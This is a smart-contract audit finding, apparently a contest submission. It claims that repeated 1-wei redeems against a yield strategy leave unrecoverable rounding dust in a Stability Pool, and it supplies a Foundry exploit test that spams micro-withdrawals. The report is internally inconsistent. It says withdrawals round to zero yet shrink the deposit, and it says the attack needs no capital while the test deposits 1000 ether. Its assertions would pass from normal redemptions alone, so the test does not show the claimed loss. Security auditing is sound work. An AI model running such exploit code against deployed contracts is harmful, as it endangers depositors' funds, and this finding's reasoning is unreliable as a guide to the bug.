# Partial withdraw dust in stability pool enables grief drain

### Summary

The internal `_freeFunds(_amount)` call simply forwards `_amount` into `SP.withdrawFromSP`, but the Stability Pool rounds withdrawals down to whole units. Repeating tiny withdrawals (e.g. 1 wei) leaves an ever-growing “dust” balance in the pool that the strategy never reclaims and that `estimatedTotalAssets()` never counts. An attacker can spam micro-withdrawals through `redeem()`, slowly draining the SP deposit and forcing chronic “losses” on every harvest.

### Root Cause

- `Strategy._freeFunds(_amount)` calls SP.withdrawFromSP(_amount, true) verbatim.
- `IStabilityPool.withdrawFromSP` applies an internal floor/round-down on the user’s shares, so fractional remainders (“dust”) stay behind.
- The strategy never loops back to recover these dust amounts.

### Internal Pre-conditions

- Strategy holds a nonzero SP deposit.
- `_amount` passed to `_freeFunds` is small enough that SP rounds the actual withdrawal down to zero.

### External Pre-conditions

None

### Attack Path

1. Attacker calls `strategy.redeem(1, attacker, attacker)` (or any micro-amount) repeatedly.
2. Each call invokes `_freeFunds(1) → SP.withdrawFromSP(1, true)`, which rounds to 0 withdrawal but reduces the contract’s SP deposit by 1 share pre-rounding.
3. The dust (fractional share) remains locked in SP, and the strategy’s recorded SP deposit shrinks.
4. On next `harvest()`/`report()`, `estimatedTotalAssets()` (which sums only BOLD and SP compounded deposits) reports a loss.
5. Repeating the cycle drains the SP position entirely over time, forcing share-price erosion and eventual vault insolvency.

### Impact

**Slow economic bleed**: Attackers need no special privileges and no capital; they drain SP deposit via free micro-withdrawals.
**Repeated fund loss**: Each “harvest” reports a loss, depressing PPS and hurting honest holders.

Medium severity under Sherlock rules: 

> exploits rounding to cause relevant losses (> $10 once repeated) and breaks core fund-accounting invariants.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/console2.sol";
import {Setup, ERC20, IStabilityPool} from "./utils/Setup.sol";
import {IStrategyInterface} from "../interfaces/IStrategyInterface.sol";

contract DustAccumulationBugPOC is Setup {

    address public attacker = address(0x1337);

    function setUp() public virtual override {
        super.setUp();
        vm.prank(management);
        strategy.allowDeposits();

        // Setup strategy with substantial assets
        uint256 depositAmount = 10000 ether;
        mintAndDepositIntoStrategy(strategy, user, depositAmount);
    }


    function test_DustAccumulationDrainsStabilityPoolDeposit() public {
        console2.log("=== DEMONSTRATING DUST ACCUMULATION BUG ===");

        // STEP 1: Record initial state
        uint256 initialTotalAssets = strategy.totalAssets();
        uint256 initialSPDeposit = IStabilityPool(strategy.SP()).getCompoundedBoldDeposit(address(strategy));
        uint256 initialShares = strategy.totalSupply();

        console2.log("STEP 1: Initial state");
        console2.log("Initial total assets:", initialTotalAssets);
        console2.log("Initial SP deposit:", initialSPDeposit);
        console2.log("Initial shares:", initialShares);

        // STEP 2: Give attacker minimal shares to enable redeem attacks
        uint256 attackerDeposit = 1000 ether;
        mintAndDepositIntoStrategy(strategy, attacker, attackerDeposit);
        uint256 attackerShares = strategy.balanceOf(attacker);

        console2.log("STEP 2: Attacker setup");
        console2.log("Attacker deposited:", attackerDeposit);
        console2.log("Attacker shares:", attackerShares);

        // STEP 3: Execute micro-withdrawal attack
        console2.log("STEP 3: Executing micro-withdrawal attack");

        uint256 microAmount = 1; // 1 wei
        uint256 attackRounds = 1000; // Spam 1000 micro-withdrawals

        uint256 totalAssetsBeforeAttack = strategy.totalAssets();
        uint256 spDepositBeforeAttack = IStabilityPool(strategy.SP()).getCompoundedBoldDeposit(address(strategy));

        console2.log("Before attack - Total assets:", totalAssetsBeforeAttack);
        console2.log("Before attack - SP deposit:", spDepositBeforeAttack);

        // Spam micro-withdrawals
        vm.startPrank(attacker);
        for (uint256 i = 0; i < attackRounds; i++) {
            // Each redeem(1) calls _freeFunds(1) which calls SP.withdrawFromSP(1, true)
            // SP rounds down the withdrawal, leaving dust behind
            if (strategy.balanceOf(attacker) > 0) {
                strategy.redeem(microAmount, attacker, attacker);
            }
        }
        vm.stopPrank();

        console2.log("Executed micro-withdrawals:", attackRounds);
        console2.log("Amount per withdrawal:", microAmount, "wei");

        // STEP 4: Measure the damage
        uint256 totalAssetsAfterAttack = strategy.totalAssets();
        uint256 spDepositAfterAttack = IStabilityPool(strategy.SP()).getCompoundedBoldDeposit(address(strategy));
        uint256 estimatedAssetsAfterAttack = strategy.estimatedTotalAssets();

        console2.log("STEP 4: Measuring damage from dust accumulation");
        console2.log("After attack - Total assets:", totalAssetsAfterAttack);
        console2.log("After attack - SP deposit:", spDepositAfterAttack);
        console2.log("After attack - Estimated assets:", estimatedAssetsAfterAttack);

        // STEP 5: Calculate losses from dust accumulation
        uint256 spDepositLoss = spDepositBeforeAttack - spDepositAfterAttack;
        uint256 totalAssetsLoss = totalAssetsBeforeAttack - totalAssetsAfterAttack;

        console2.log("STEP 5: Calculating accumulated losses");
        console2.log("SP deposit lost to dust:", spDepositLoss);
        console2.log("Total assets lost:", totalAssetsLoss);
        console2.log("Loss percentage:", totalAssetsLoss * 100 / totalAssetsBeforeAttack, "%");

        // STEP 6: Demonstrate chronic loss reporting
        console2.log("STEP 6: Demonstrating chronic loss reporting");

        // The strategy now reports losses because dust is unrecoverable
        assertTrue(spDepositAfterAttack < spDepositBeforeAttack, "SP deposit should decrease due to dust");
        assertTrue(totalAssetsAfterAttack < totalAssetsBeforeAttack, "Total assets should decrease");

        // STEP 7: Show the attack can be repeated to drain more
        console2.log("STEP 7: Attack can be repeated to drain entire SP position");

        uint256 remainingSPDeposit = spDepositAfterAttack;
        uint256 estimatedAttacksToEmpty = remainingSPDeposit / attackRounds; // Rough estimate

        console2.log("Remaining SP deposit:", remainingSPDeposit);
        console2.log("Estimated attacks needed to drain SP:", estimatedAttacksToEmpty);

        // STEP 8: Simulate continued attack to show escalating damage
        console2.log("STEP 8: Simulating continued attack");

        // Execute more rounds to show escalating damage
        vm.startPrank(attacker);
        for (uint256 i = 0; i < attackRounds * 2; i++) { // 2x more attacks
            if (strategy.balanceOf(attacker) > microAmount) {
                strategy.redeem(microAmount, attacker, attacker);
            }
        }
        vm.stopPrank();

        uint256 finalSPDeposit = IStabilityPool(strategy.SP()).getCompoundedBoldDeposit(address(strategy));
        uint256 finalTotalAssets = strategy.totalAssets();

        console2.log("After extended attack:");
        console2.log("Final SP deposit:", finalSPDeposit);
        console2.log("Final total assets:", finalTotalAssets);
        console2.log("Total dust accumulated:", spDepositBeforeAttack - finalSPDeposit);

        // Calculate loss percentage inline to avoid stack too deep
        uint256 totalLoss = totalAssetsBeforeAttack - finalTotalAssets;
        console2.log("Total loss percentage:", totalLoss * 100 / totalAssetsBeforeAttack, "%");

        // Verify the attack causes significant damage
        assertGt(spDepositBeforeAttack - finalSPDeposit, 0, "Dust should accumulate");
        assertTrue(finalSPDeposit < spDepositBeforeAttack, "SP deposit should be drained");
        assertTrue(finalTotalAssets < totalAssetsBeforeAttack, "Total assets should decrease");

    }
}
```
